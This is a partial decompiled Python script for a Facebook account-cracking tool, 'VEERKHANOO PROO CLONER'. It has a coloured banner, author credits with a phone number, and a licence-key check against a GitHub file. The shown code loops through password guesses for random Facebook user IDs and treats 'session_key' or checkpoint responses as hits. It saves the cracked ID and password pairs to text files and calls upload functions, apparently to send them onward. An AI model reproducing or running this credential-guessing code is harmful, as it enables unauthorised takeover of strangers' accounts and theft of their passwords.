...
# Time Succes decompile : 2022-06-01 10:27:51.909999
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/veerlala/khan12/main/khan123.txt').text
			if basesplit in plr:
				key = basesplit
...
$$  \ /$$/ $$    |   $$    |   $$    $$< 
 $$  /$$/  $$$$$/    $$$$$/    $$$$$$$  |
  $$ $$/   $$ |_____ $$ |_____ $$ |  $$ |
   $$$/    $$       |$$       |$$ |  $$ |
    $/     $$$$$$$$/ $$$$$$$$/ $$/   $$/ 
\033[41m\033[1;37m[Kaleem]   [SONU]   [veer]   [umar khail]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : Mudassirkhan\033[1;32m[RRSN]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mTEAM KRSN RK\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  03439635677           │
\033[1;36m│ [✓] POWER VEER : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [VEER] [pÏඋඋħÏ]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %sVEERKHANOO❌ PROO CLONER❌"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s2.0"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		print("")
		print("\n%s [%s1%s]%s CRACK RANDOM FB ID 2012-15 %s(PRO)"%(R,G,R,Y,W))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [veer] : %s/%s -> \033[0;92m [ veer-OK:%s ]- \033[0;91m[veer-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [veer-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[veer-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [veer-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
